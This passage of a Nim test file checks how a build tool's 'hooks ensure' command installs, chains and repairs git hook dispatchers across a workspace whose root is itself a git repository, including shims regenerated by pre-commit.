## ``repro hooks ensure --vcs`` must reconcile EVERY participating repo of a
## workspace whose root directory is itself a Git repository, and must be able
## to reinstall its dispatcher after a foreign hook installer overwrites it a
## second time.
##
## Why this shape exists
## ---------------------
##
## Real workspaces keep their manifests in the workspace root, and that root is
## a checked-out Git repo (``metacraft-labs/workspace``). Every pre-existing
## M17 fixture builds the workspace root with a bare ``createDir``, so the
## "root is also a repo" shape — the only shape that ships — was never
## exercised. ``enumerateParticipatingRepos`` short-circuits to
## ``single-repo`` the moment ``gitTopLevel(workspaceRoot)`` equals the root,
## which means ``repro hooks ensure --vcs`` run from a real workspace root
## reconciles the root repo alone and reports success. Participating repos
## silently keep whatever hooks (or no hooks) they have, the pre-push
## publication gate never runs in them, and no workspace lock is ever published
## for their commits — which is what CI then fails on, far downstream, as
## "No workspace lock for <repo>".
##
## The second case is the other half of the same outage. ``ensure`` chains a
## pre-existing user hook to ``<hook>.repro-local``. When a foreign installer
## (pre-commit's ``pre-commit install``) later re-takes the standard hook path,
## the dispatcher is gone AGAIN while ``<hook>.repro-local`` still holds the
## copy chained the first time. The installer then refuses with "is user-owned
## and ... already exists" — so the documented remedy for a shadowed hook
## cannot repair the single state a shadowed hook is actually found in.
##
## The third and fourth cases are that same refusal in the shape it is actually
## met in, and the prevention that keeps it from arising. pre-commit's
## installer re-runs exactly when its generated config changes, and the
## toolchain rebuild that changes the config also moves the store paths baked
## into the shim it writes — so the second copy DIFFERS from the preserved
## first one, byte-equality cannot see that they are one installer's output
## written twice, and the refusal fires. ``ensure`` must recognise a
## regenerated shim and repair; and ``scripts/pre_commit_hook_handoff.sh``,
## which the dev shell runs on either side of the installer, must keep the
## state from arising at all WITHOUT ever uncovering the dispatcher itself.
##
## The remaining cases pin the EDGES of "recognised as the same shim", each by
## varying exactly one thing and holding the rest byte-identical: no template
## ``# ID:`` (not recognised at all), a moved interpreter path (recognised),
## different ``ARGS`` (not recognised), an ``INSTALL_PYTHON`` value that is
## shell syntax rather than a path (not recognised), an ``exec`` target that is
## a shell expansion (not recognised), a different indentation on the two
## reduced lines (not recognised), CRLF against LF (not recognised), and a
## different ``# ID:`` VALUE (not recognised). Every one of those properties was
## asserted by the implementation and reachable by no test — breaking any of
## them left the suite green — which is the only reason they are separate
## cases rather than assertions folded into the case above. The ``# ID:`` value
## is the one the handoff's design rests on: "a template revision bump changes
## the ``# ID:`` line, so ``ensure`` refuses" is why ``before`` has no resume
## step. The last two cases do the same for the handoff: it must leave a
## HAND-WRITTEN chained hook alone, and a shell entry that dies after the
## installer must converge on one chained copy without a refusal.
##
## Falsifiability / anti-vacuity
## -----------------------------
##
## Every assertion here POSITIVELY finds what it expects rather than asserting
## an absence:
##
##   * the repo set is asserted to CONTAIN all three participating repos and to
##     have an exact size, so a resolver that enumerates nothing fails;
##   * the entry count is asserted against an exact expected number
##     (repos x hooks), so an installer that writes zero hooks fails;
##   * the dispatcher files are read back and asserted to CARRY the sentinel,
##     so a missing file fails rather than passing an "is not foreign" test;
##   * the repaired chain is EXECUTED and both the chained shim's marker file
##     and the managed body's marker are asserted present, so a dispatcher that
##     is bytes-correct but does not actually run its chain fails.
##
## Hermetic: local bare origins under one ``createTempDir``; no network. Skip
## only when ``git`` is missing (the M9-M17 convention).

import std/[json, os, sequtils, strutils, tempfiles, unittest]

import repro_test_support
import repro_workspace_manifests

proc repoRoot(): string =
  currentSourcePath().parentDir.parentDir.parentDir

proc reproBinary(): string =
  requireBinary(repoRoot() / "build" / "bin" / addFileExt("repro", ExeExt),
    "reprobuild.apps.repro")

proc git(gitBin: string; args: openArray[string]; cwd = ""): CmdResult =
  var argv = @[gitBin]
  argv.add(@args)
  runShell(shellCommand(argv), cwd = if cwd.len > 0: cwd else: getCurrentDir())

proc requireGit(gitBin: string; args: openArray[string]; cwd = "") =
  let res = git(gitBin, args, cwd)
  if res.code != 0:
    checkpoint("git " & args.join(" ") & " failed in " & cwd &
      "\nexit=" & $res.code & "\n" & res.output)
    fail()

const HookNames = ["pre-push", "post-commit", "post-merge", "post-checkout"]

# ---------------------------------------------------------------------------
# Fixture: three sibling repos plus a workspace root that is ITSELF a git repo
# carrying the manifests, exactly like metacraft-labs/workspace.
# ---------------------------------------------------------------------------

type WsFixture = object
  scratch: string
  reproBin: string
  root: string
  repoNames: seq[string]

proc seedOrigin(gitBin, originPath, workPath: string) =
  requireGit(gitBin, ["init", "--bare", "-b", "main", originPath])
  requireGit(gitBin, ["init", "-b", "main", workPath])
  requireGit(gitBin, ["-C", workPath, "config", "user.email",
    "tester@example.invalid"])
  requireGit(gitBin, ["-C", workPath, "config", "user.name", "Hook Tester"])
  writeFile(workPath / "README.md", "fixture\n")
  requireGit(gitBin, ["-C", workPath, "add", "README.md"])
  requireGit(gitBin, ["-C", workPath, "commit", "-m", "fixture"])
  requireGit(gitBin, ["-C", workPath, "remote", "add", "origin", originPath])
  requireGit(gitBin, ["-C", workPath, "push", "origin", "main"])

proc projectToml(urls: openArray[string]): string =
  result =
    "schema = \"reprobuild.workspace.project.v1\"\n\n" &
    "[project]\nname = \"wsroot\"\ndefault_revision = \"main\"\n" &
    "trunk = \"main\"\n\n"
  for i, url in urls:
    result.add("[[remote]]\nname = \"lib-" & $i & "-origin\"\nfetch = \"" &
      url & "\"\n\n")
  result.add("includes = [\n")
  for i in 0 ..< urls.len:
    result.add("  \"repos/lib-" & $i & ".toml\",\n")
  result.add("]\n")

proc repoFragment(i: int): string =
  "schema = \"reprobuild.workspace.repo.v1\"\n\n" &
  "[repo]\nname = \"lib-" & $i & "\"\npath = \"lib-" & $i & "\"\n" &
  "remote = \"lib-" & $i & "-origin\"\nrevision = \"main\"\n"

proc setupWorkspace(gitBin, slug: string; gitBackedRoot: bool): WsFixture =
  result.scratch = createTempDir("repro-wsroot-" & slug & "-", "")
  result.reproBin = reproBinary()
  result.root = result.scratch / "workspace"
  createDir(result.root)

  var urls: seq[string]
  for i in 0 ..< 3:
    let name = "lib-" & $i
    result.repoNames.add(name)
    let origin = result.scratch / ("origin-" & name & ".git")
    seedOrigin(gitBin, origin, result.scratch / ("seed-" & name))
    urls.add(fileUrl(origin))
    requireGit(gitBin, ["clone", fileUrl(origin), result.root / name])
    requireGit(gitBin, ["-C", result.root / name, "config", "user.email",
      "tester@example.invalid"])
    requireGit(gitBin, ["-C", result.root / name, "config", "user.name",
      "Hook Tester"])

  createDir(result.root / "projects")
  createDir(result.root / "repos")
  writeFile(result.root / "projects" / "wsroot.toml", projectToml(urls))
  for i in 0 ..< 3:
    writeFile(result.root / "repos" / ("lib-" & $i & ".toml"), repoFragment(i))
  createDir(result.root / ".repro")
  writeFile(result.root / ".repro" / "workspace.toml",
    "schema = \"reprobuild.workspace.local.v1\"\n\n" &
    "[workspace]\nproject = \"wsroot\"\nprojects = [\"wsroot\"]\n")

  if gitBackedRoot:
    # The shape that ships: the manifests live in a checked-out repo, so the
    # workspace root and a git top-level are the same directory.
    requireGit(gitBin, ["init", "-b", "main", result.root])
    requireGit(gitBin, ["-C", result.root, "config", "user.email",
      "tester@example.invalid"])
    requireGit(gitBin, ["-C", result.root, "config", "user.name",
      "Hook Tester"])
    writeFile(result.root / ".gitignore", "lib-0/\nlib-1/\nlib-2/\n")
    requireGit(gitBin, ["-C", result.root, "add", "-A"])
    requireGit(gitBin, ["-C", result.root, "commit", "-m", "manifests"])

proc ensure(fx: WsFixture; json = true): CmdResult =
  var argv = @[fx.reproBin, "hooks", "ensure", "--vcs",
    "--workspace-root=" & fx.root]
  if json: argv.add("--json")
  runShell(shellCommand(argv), cwd = fx.root)

proc hooksDirOf(repoPath: string): string = repoPath / ".git" / "hooks"

proc isDispatcher(path: string): bool =
  fileExists(path) and "reprobuild hook dispatcher" in readFile(path)

proc isManagedBody(path: string): bool =
  fileExists(path) and "reprobuild managed" in readFile(path)

# A pre-commit `hook-impl`-shaped shim. Writing its marker proves it RAN.
proc preCommitShim(marker, ranFile: string): string =
  "#!/usr/bin/env sh\n" &
  "# File generated by pre-commit: https://pre-commit.com\n" &
  "printf '%s\\n' " & quoteShell(marker) & " >> " & quoteShell(ranFile) & "\n" &
  "exit 0\n"

# The REAL shape `pre-commit install` writes, template and all. The three
# things that move between two runs of the installer — the interpreter, the
# `INSTALL_PYTHON` path, and the `pre-commit` it execs — are parameters here
# for the same reason they are the parameters in practice: on Nix all three are
# store paths, and a toolchain rebuild moves them.
#
# `indent` and `lineEnding` are parameters for the same reason: they are the two
# things the identity keeps that are invisible in a diff of the words, so the
# only way to write a case that varies exactly one of them is to generate it.
proc generatedPreCommitShim(pythonPath, preCommitPath, hookType: string;
                            interpreter = "/usr/bin/env bash";
                            id = "138fd403232d2ddd5efb44317e38bf03";
                            indent = "";
                            lineEnding = "\n"): string =
  result =
    "#!" & interpreter & "\n" &
    "# File generated by pre-commit: https://pre-commit.com\n" &
    "# ID: " & id & "\n" &
    "\n" &
    "# start templated\n" &
    indent & "INSTALL_PYTHON=" & pythonPath & "\n" &
    "ARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=" &
      hookType & ")\n" &
    "# end templated\n" &
    "\n" &
    "HERE=\"$(cd \"$(dirname \"$0\")\" && pwd)\"\n" &
    "ARGS+=(--hook-dir \"$HERE\" -- \"$@\")\n" &
    "\n" &
    indent & "exec " & preCommitPath & " \"${ARGS[@]}\"\n"
  if lineEnding != "\n":
    result = result.replace("\n", lineEnding)

# The same template with pre-commit's own `# ID:` line REMOVED: a hand-written
# script that merely mentions pre-commit in a comment. `ensure` must not treat
# two of these as one installer's output.
proc unidentifiedPreCommitShim(pythonPath: string): string =
  let full = generatedPreCommitShim(pythonPath, "/bin/true", "pre-push")
  full.splitLines().filterIt(not it.startsWith("# ID: ")).join("\n")

# Every line of `body` except those the caller is deliberately varying. Used to
# make each discrimination test's premise MACHINE-CHECKED rather than asserted
# in a comment: if a future edit makes two shims differ in a second place, the
# test that says "these differ only in X" fails instead of quietly passing for
# the wrong reason.
proc linesExcept(body, marker: string): seq[string] =
  body.splitLines().filterIt(marker notin it)

proc linesExceptAny(body: string; markers: openArray[string]): seq[string] =
  for line in body.splitLines():
    var dropped = false
    for m in markers:
      if m in line:
        dropped = true
    if not dropped:
      result.add(line)

# How many of `body`'s lines contain `marker`. Every "these differ only in X"
# premise below also asserts this is 1, because a marker that matches a SECOND
# line would quietly widen the exception and let the premise hold for a body
# that differs somewhere else too. `ARGS=(` vs `ARGS+=(` is the near miss that
# makes the point: the two lines are one character apart.
proc lineCountWith(body, marker: string): int =
  for line in body.splitLines():
    if marker in line:
      inc result

# A stand-in for the `pre-commit` executable the shim execs, which appends its
# own marker. Having the shim exec something REAL is what lets the chained hook
# be executed rather than only inspected.
#
# It is installed as `<dir>/pre-commit`, with the VERSION in the directory, for
# the same reason the real one is: `/nix/store/<hash>-pre-commit-4.5.1/bin/
# pre-commit`. Two builds therefore differ in the directory and agree on the
# file name, which is what makes the file name usable as identity.
proc writeFakePreCommit(dir, marker, ranFile: string): string =
  createDir(dir)
  result = dir / "pre-commit"
  writeFile(result,
    "#!/usr/bin/env sh\n" &
    "printf '%s\\n' " & quoteShell(marker) & " >> " & quoteShell(ranFile) &
      "\n" &
    "exit 0\n")
  inclFilePermissions(result, {fpUserExec})

proc handoffScript(): string =
  repoRoot() / "scripts" / "pre_commit_hook_handoff.sh"

proc handoff(hooksDir, mode: string): CmdResult =
  runShell(shellCommand(@["bash", handoffScript(), mode,
    "--hooks-dir", hooksDir, "--hook", "pre-push"]), cwd = hooksDir)

suite "hooks ensure reconciles a git-backed workspace root":

  test "test_ensure_reaches_every_repo_when_the_workspace_root_is_a_git_repo":
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "reach", gitBackedRoot = true)
      defer: removeDir(fx.scratch)

      # Control: the root really IS a git top-level, so this fixture models
      # the shape that regressed and not a plain directory.
      let topLevel = git(gitBin, ["-C", fx.root, "rev-parse",
        "--show-toplevel"])
      check topLevel.code == 0
      check sameFile(topLevel.output.strip(), fx.root)

      let res = ensure(fx)
      checkpoint(res.output)
      check res.code == 0

      let report = parseJson(res.output)
      check report["mode"].getStr() == "workspace"
      check report["project"].getStr() == "wsroot"

      let repos = report["repos"].getElems().mapIt(it.getStr())
      # Positive membership + exact size: an empty or truncated enumeration
      # cannot read as success.
      for name in fx.repoNames:
        check name in repos
      # The workspace root repo participates too — it is pushed like any
      # other, and before the fix it was the ONLY repo the root-invoked
      # ensure reached. Losing it would trade one gap for another.
      check lastPathPart(fx.root) in repos
      check repos.len == fx.repoNames.len + 1

      let entries = report["entries"].getElems()
      check entries.len == (fx.repoNames.len + 1) * HookNames.len

      # And on disk, in every participating repo, for every hook.
      var installed = 0
      for repoPath in fx.repoNames.mapIt(fx.root / it) & @[fx.root]:
        let hooksDir = hooksDirOf(repoPath)
        for hookName in HookNames:
          check isDispatcher(hooksDir / hookName)
          check isManagedBody(hooksDir / (hookName & ".repro-managed"))
          inc installed
      check installed == (fx.repoNames.len + 1) * HookNames.len

  test "test_ensure_reinstalls_the_dispatcher_after_a_second_shadowing":
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "reshadow", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let target = fx.root / "lib-0"
      let hooksDir = hooksDirOf(target)
      let ranFile = fx.scratch / "shim-ran.txt"
      let shim = preCommitShim("shim", ranFile)

      # 1. A foreign installer owns pre-push first; ensure chains it.
      writeFile(hooksDir / "pre-push", shim)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let first = ensure(fx)
      checkpoint(first.output)
      check first.code == 0
      check isDispatcher(hooksDir / "pre-push")
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == shim

      # 2. The foreign installer runs AGAIN and re-takes the standard path.
      #    This is the state every shadowed repo is found in.
      writeFile(hooksDir / "pre-push", shim)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check not isDispatcher(hooksDir / "pre-push")

      # 3. The documented remedy must repair it.
      let second = ensure(fx)
      checkpoint(second.output)
      check second.code == 0
      check isDispatcher(hooksDir / "pre-push")
      check isManagedBody(hooksDir / "pre-push.repro-managed")
      check fileExists(hooksDir / "pre-push.repro-local")
      check readFile(hooksDir / "pre-push.repro-local") == shim

      # 4. And the repaired chain must actually RUN the preserved shim.
      #    Git hands a pre-push hook the ref list on stdin and the dispatcher
      #    reads it to EOF before doing anything, so stdin must be closed
      #    explicitly — inheriting the test process's stdin hangs forever. An
      #    empty stream is also what makes the managed body a clean no-op,
      #    which isolates the chaining from the publication gate.
      removeFile(ranFile)
      #    ``REPROBUILD_REPRO`` names the build that generated this hook. The
      #    managed body refuses to let a ``repro`` it does not recognise speak
      #    for it, and the ``repro`` on a developer's PATH is routinely a
      #    different build — so pinning it here is what makes the assertion
      #    about the CHAIN rather than about the ambient PATH.
      let run = runShell(shellCommand(
        @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
          quoteShell(fileUrl(fx.scratch / "origin-lib-0.git")) &
          " < /dev/null"],
        @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = target)
      checkpoint(run.output)
      check run.code == 0
      check fileExists(ranFile)
      check "shim" in readFile(ranFile)

  test "test_a_manifest_backend_checkout_is_still_a_single_repo_target":
    # The counterweight to the case above, and the reason the "explicitly
    # targeted Git worktree" guard exists at all. The manifest LOCK BACKEND
    # is a checkout that carries manifest-shaped `projects/` and `repos/`
    # data and declares no workspace. Enumerating it as a workspace would
    # look for `<manifest>/<repo.path>` children that do not exist, install
    # zero hooks, and print a remediation that cannot work. Widening the
    # workspace branch to "has projects/" instead of "declares a workspace"
    # would silently break it, so it is asserted here.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "backend", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      # Same tree, minus the one thing that DECLARES a workspace.
      removeFile(fx.root / ".repro" / "workspace.toml")
      check dirExists(fx.root / "projects")   # positively still manifest-shaped
      check dirExists(fx.root / "repos")

      let res = ensure(fx)
      checkpoint(res.output)
      check res.code == 0
      # The legacy single-repo line, naming this checkout's own hooks dir.
      check "VCS hooks ensure" in res.output
      check (fx.root / ".git" / "hooks") in res.output
      # Its own hooks are installed...
      check isDispatcher(hooksDirOf(fx.root) / "pre-push")
      # ...and it did NOT reach into the sibling checkouts.
      check not fileExists(hooksDirOf(fx.root / "lib-0") / "pre-push")

  test "test_a_surviving_hook_repairs_a_deleted_pre_push_gate":
    # The dev shell runs pre-commit's installer on EVERY entry
    # (``shellHook = pre-commit-check.shellHook``), and for a config that
    # does not declare a pre-push stage that installer DELETES
    # ``.git/hooks/pre-push`` outright — leaving the managed body orphaned
    # beside it. Nothing re-ran ``ensure``, so the publication gate stayed
    # off and every later commit pushed unlocked. The hooks pre-commit is
    # not configured for still run, so they must put the gate back.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "selfheal", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let target = fx.root / "lib-2"
      let hooksDir = hooksDirOf(target)

      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")

      # Reproduce what `pre-commit uninstall --hook-type pre-push` does.
      removeFile(hooksDir / "pre-push")
      check not fileExists(hooksDir / "pre-push")
      # The managed body is still there, orphaned — this is the exact
      # on-disk shape the fleet was found in.
      check isManagedBody(hooksDir / "pre-push.repro-managed")
      # And post-commit survived, because pre-commit was not managing it.
      check isDispatcher(hooksDir / "post-commit")

      let healed = runShell(shellCommand(
        @[fx.reproBin, "hooks", "dispatch", "post-commit",
          "--protocol=2", "--repo-root", target]), cwd = target)
      checkpoint(healed.output)
      check healed.code == 0
      # Positively assert the repair happened AND was announced, so a
      # dispatch that silently does nothing cannot pass.
      check isDispatcher(hooksDir / "pre-push")
      check "repaired pre-push" in healed.output

  test "test_hook_repair_preserves_an_active_dispatcher_reader":
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "atomic-repair", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let target = fx.root / "lib-2"
      let dispatcher = hooksDirOf(target) / "post-commit"

      check ensure(fx).code == 0
      let canonical = readFile(dispatcher)
      let drifted = canonical & "# drift that reconciliation must replace\n"
      writeFile(dispatcher, drifted)
      inclFilePermissions(dispatcher, {fpUserExec})

      # A running shell holds the same kind of read handle. After an atomic
      # rename it must finish reading the old inode; a truncate-in-place repair
      # makes this value a splice of the old prefix and canonical replacement.
      var activeReader: File
      check open(activeReader, dispatcher, fmRead)
      defer: activeReader.close()
      var prefix = newString(32)
      let prefixLen = activeReader.readBuffer(addr prefix[0], prefix.len)
      prefix.setLen(prefixLen)

      let repaired = ensure(fx)
      checkpoint(repaired.output)
      check repaired.code == 0
      let observedByActiveReader = prefix & activeReader.readAll()
      check observedByActiveReader == drifted
      check readFile(dispatcher) == canonical
      check not fileExists(dispatcher & ".repro-write-" &
        $getCurrentProcessId() & ".tmp")

  test "test_ensure_still_refuses_a_second_distinct_user_hook":
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "conflict", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-1")
      let ranFile = fx.scratch / "conflict-ran.txt"

      writeFile(hooksDir / "pre-push", preCommitShim("first", ranFile))
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check fileExists(hooksDir / "pre-push.repro-local")

      # A genuinely DIFFERENT user hook arrives. There is no basis for
      # discarding either one, so ensure must refuse loudly and name both.
      writeFile(hooksDir / "pre-push", preCommitShim("second", ranFile))
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check "pre-push" in refused.output
      check (hooksDir / "pre-push.repro-local") in refused.output
      # The first shim is not silently destroyed.
      check readFile(hooksDir / "pre-push.repro-local") ==
        preCommitShim("first", ranFile)

  test "test_ensure_repairs_a_regenerated_pre_commit_shim":
    # The refusal above is right for two AUTHORS' hooks and wrong for one
    # installer's output written twice, and the second is what the fleet hits.
    # `pre-commit install` re-runs precisely when its generated config changes,
    # and on Nix the same rebuild that changes the config also moves the store
    # paths baked into the shim — so the newly written shim DIFFERS from the
    # copy `ensure` preserved, byte-equality does not see that they are the
    # same hook, and the remedy for a shadowed hook refused exactly when a
    # shadowed hook existed. The repo was then left with no publication gate
    # and no working way to reinstall one.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "regen", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let target = fx.root / "lib-1"
      let hooksDir = hooksDirOf(target)
      let ranFile = fx.scratch / "regen-ran.txt"

      # Two toolchain generations: different directories, different Python
      # file names, and — as in reality — the same `pre-commit` file name.
      let pcV1 = writeFakePreCommit(fx.scratch / "pre-commit-4.5.1" / "bin",
        "v1", ranFile)
      let pcV2 = writeFakePreCommit(fx.scratch / "pre-commit-4.6.0" / "bin",
        "v2", ranFile)
      let shimV1 = generatedPreCommitShim(
        fx.scratch / "python3-3.13.12" / "bin" / "python3.13", pcV1, "pre-push")
      let shimV2 = generatedPreCommitShim(
        fx.scratch / "python3-3.14.1" / "bin" / "python3.14", pcV2, "pre-push")
      # Anti-vacuity: the two shims really are different files, so a pass
      # cannot come from the byte-identical branch that already existed.
      check shimV1 != shimV2

      # 1. The installer's first output is chained, as always.
      writeFile(hooksDir / "pre-push", shimV1)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check isDispatcher(hooksDir / "pre-push")
      check readFile(hooksDir / "pre-push.repro-local") == shimV1

      # 2. A rebuild moves the tool paths. pre-commit's installer re-runs,
      #    finds a hook it did not write, announces migration mode by moving
      #    the dispatcher to `<hook>.legacy`, and writes its new shim.
      moveFile(hooksDir / "pre-push", hooksDir / "pre-push.legacy")
      writeFile(hooksDir / "pre-push", shimV2)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check not isDispatcher(hooksDir / "pre-push")

      # 3. The documented remedy must REPAIR this, not refuse it.
      let repaired = ensure(fx)
      checkpoint(repaired.output)
      check repaired.code == 0
      check isDispatcher(hooksDir / "pre-push")
      check isManagedBody(hooksDir / "pre-push.repro-managed")
      # The chained copy is the one the installer just wrote — the stale copy
      # names tool paths a rebuild has already collected.
      check readFile(hooksDir / "pre-push.repro-local") == shimV2
      check not fileExists(hooksDir / "pre-push.legacy")

      # 4. And the repaired chain RUNS the new shim, not the old one.
      removeFile(ranFile)
      let run = runShell(shellCommand(
        @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
          quoteShell(fileUrl(fx.scratch / "origin-lib-1.git")) &
          " < /dev/null"],
        @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = target)
      checkpoint(run.output)
      check run.code == 0
      check fileExists(ranFile)
      check "v2" in readFile(ranFile)
      check "v1" notin readFile(ranFile)

  test "test_ensure_refuses_two_shims_that_carry_no_pre_commit_template_id":
    # DISCRIMINATION TEST for the `# ID:` requirement in
    # `regeneratedShimIdentity`. Two files that mention pre-commit in a comment
    # but carry no template ID differ ONLY in a path the normalisation reduces
    # away — so if the ID were not required, they would be recognised as one
    # installer's output and one of them silently discarded. They are not: a
    # hand-written script is a user's, and losing it is exactly what the
    # refusal exists to prevent.
    #
    # Without this case the requirement was asserted and untested: the pre-
    # existing refusal test's two shims differ in a `printf` line that no
    # normalisation touches, so it refuses either way and dropping the ID check
    # reddened nothing.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "noid", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-0")
      let bodyA = unidentifiedPreCommitShim(fx.scratch / "py-a" / "bin" / "python3")
      let bodyB = unidentifiedPreCommitShim(fx.scratch / "py-b" / "bin" / "python3")

      # Premise, machine-checked: they differ, and ONLY in the reduced line.
      check bodyA != bodyB
      check linesExcept(bodyA, "INSTALL_PYTHON=") ==
        linesExcept(bodyB, "INSTALL_PYTHON=")
      # And positively: neither carries the template ID that would make them
      # recognisable, so the test is about the ID and not about something else.
      check "# ID: " notin bodyA
      check "# ID: " notin bodyB

      writeFile(hooksDir / "pre-push", bodyA)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == bodyA

      writeFile(hooksDir / "pre-push", bodyB)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      # Neither copy is destroyed.
      check readFile(hooksDir / "pre-push.repro-local") == bodyA
      check readFile(hooksDir / "pre-push") == bodyB

  test "test_ensure_repairs_a_shim_whose_interpreter_path_moved":
    # DISCRIMINATION TEST for the `#!` normalisation. Two real pre-commit shims
    # identical in EVERY byte except the directory their interpreter lives in —
    # the same file name, `bash`, in two store paths, which is what a toolchain
    # rebuild produces. Without the shebang reduction these are two different
    # files and `ensure` refuses, leaving the repo with no publication gate.
    #
    # The pre-existing regeneration test writes `#!/usr/bin/env bash` in BOTH
    # shims, so the shebang line is already identical there and removing the
    # normalisation reddened nothing.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let bashBin = findExe("bash")
      if bashBin.len == 0:
        skip()
      else:
        let fx = setupWorkspace(gitBin, "shebang", gitBackedRoot = true)
        defer: removeDir(fx.scratch)
        let target = fx.root / "lib-0"
        let hooksDir = hooksDirOf(target)
        let ranFile = fx.scratch / "shebang-ran.txt"

        # Two generations of the SAME interpreter: different directory, same
        # file name. Real symlinks, so the chain can actually be executed.
        var interps: seq[string]
        for gen in ["bash-5.2", "bash-5.3"]:
          createDir(fx.scratch / gen / "bin")
          let link = fx.scratch / gen / "bin" / "bash"
          createSymlink(bashBin, link)
          interps.add(link)

        # Everything else is held fixed: one Python path, one `pre-commit`.
        let pc = writeFakePreCommit(fx.scratch / "pc" / "bin", "pc", ranFile)
        let py = fx.scratch / "py" / "bin" / "python3"
        let shimA = generatedPreCommitShim(py, pc, "pre-push",
          interpreter = interps[0])
        let shimB = generatedPreCommitShim(py, pc, "pre-push",
          interpreter = interps[1])

        # Premise, machine-checked: they differ, and ONLY in the `#!` line.
        check shimA != shimB
        check linesExcept(shimA, "#!") == linesExcept(shimB, "#!")

        writeFile(hooksDir / "pre-push", shimA)
        inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
        check ensure(fx).code == 0
        check readFile(hooksDir / "pre-push.repro-local") == shimA

        # The rebuild moves the interpreter; pre-commit's installer re-runs.
        moveFile(hooksDir / "pre-push", hooksDir / "pre-push.legacy")
        writeFile(hooksDir / "pre-push", shimB)
        inclFilePermissions(hooksDir / "pre-push", {fpUserExec})

        let repaired = ensure(fx)
        checkpoint(repaired.output)
        check repaired.code == 0
        check isDispatcher(hooksDir / "pre-push")
        check isManagedBody(hooksDir / "pre-push.repro-managed")
        # The chained copy is the one naming the interpreter that still exists.
        check readFile(hooksDir / "pre-push.repro-local") == shimB
        check not fileExists(hooksDir / "pre-push.legacy")

        # And the repaired chain RUNS, through the new interpreter.
        if fileExists(ranFile): removeFile(ranFile)
        let run = runShell(shellCommand(
          @["sh", "-c", quoteShell(hooksDir / "pre-push") & " origin " &
            quoteShell(fileUrl(fx.scratch / "origin-lib-0.git")) &
            " < /dev/null"],
          @[("REPROBUILD_REPRO", fx.reproBin)]), cwd = target)
        checkpoint(run.output)
        check run.code == 0
        check fileExists(ranFile)
        check "pc" in readFile(ranFile)

  test "test_ensure_refuses_shims_whose_pre_commit_arguments_differ":
    # DISCRIMINATION TEST for the `ARGS=(…)` line, which the normalisation must
    # NOT touch. Two real pre-commit shims identical in every byte except the
    # `--hook-type` inside `ARGS`: one runs the repo's pre-push checks, the
    # other runs its pre-commit checks. Discarding either loses a stage's
    # checks, so this must refuse — and refusing is the ONLY thing that
    # distinguishes the shipped normalisation from one that also elides `ARGS`.
    #
    # Untested until now: widening the normalisation to elide the whole
    # `ARGS=(…)` line reddened nothing in the suite.
    let gitBin = findExe("git")
    if gitBin.len == 0:
      skip()
    else:
      let fx = setupWorkspace(gitBin, "args", gitBackedRoot = true)
      defer: removeDir(fx.scratch)
      let hooksDir = hooksDirOf(fx.root / "lib-1")
      let ranFile = fx.scratch / "args-ran.txt"
      let pc = writeFakePreCommit(fx.scratch / "pc" / "bin", "pc", ranFile)
      let py = fx.scratch / "py" / "bin" / "python3"
      let shimPush = generatedPreCommitShim(py, pc, "pre-push")
      let shimCommit = generatedPreCommitShim(py, pc, "pre-commit")

      # Premise, machine-checked: they differ, and ONLY in the `ARGS=(` line.
      check shimPush != shimCommit
      check linesExcept(shimPush, "ARGS=(") == linesExcept(shimCommit, "ARGS=(")

      writeFile(hooksDir / "pre-push", shimPush)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      check ensure(fx).code == 0
      check readFile(hooksDir / "pre-push.repro-local") == shimPush

      writeFile(hooksDir / "pre-push", shimCommit)
      inclFilePermissions(hooksDir / "pre-push", {fpUserExec})
      let refused = ensure(fx)
      checkpoint(refused.output)
      check refused.code != 0
      check (hooksDir / "pre-push.repro-local") in refused.output
      check readFile(hooksDir / "pre-push.repro-local") == shimPush
      check readFile(hooksDir / "pre-push") == shimCommit

  test "test_ensure_refuses_shims_whose_install_python_is_shell_syntax":
